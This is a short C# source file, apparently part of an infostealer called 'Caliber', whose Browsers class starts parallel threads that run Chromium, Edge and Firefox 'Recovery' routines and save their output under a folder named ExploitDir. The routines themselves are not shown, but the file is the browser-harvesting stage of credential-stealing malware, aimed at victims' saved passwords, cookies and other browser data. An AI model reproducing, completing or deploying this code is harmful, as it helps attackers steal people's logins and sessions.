using System;
using System.Collections.Generic;
using System.Threading;

namespace youknowcaliber
{
    class Browsers
    {
        public static void Start()
        {
            string zxczxc = Help.ExploitDir;
            // List with threads
            List<Thread> Threads = new List<Thread>();
            try
            {
                Threads.Add(new Thread(() =>
                {
                    Chromium.Recovery.Run(zxczxc + "\\Browsers");
                    Edge.Recovery.Run(zxczxc + "\\Browsers");
                }));

                Threads.Add(new Thread(() =>
                   Firefox.Recovery.Run(zxczxc + "\\Browsers")
               ));
                
                // Start all threads
                foreach (Thread t in Threads)
                    t.Start();
                // Wait all threads
                foreach (Thread t in Threads)
                    t.Join();
               // URLSearcher.GetDomainDetect(zxczxc + "\\Browsers\\");
            }
            catch(Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
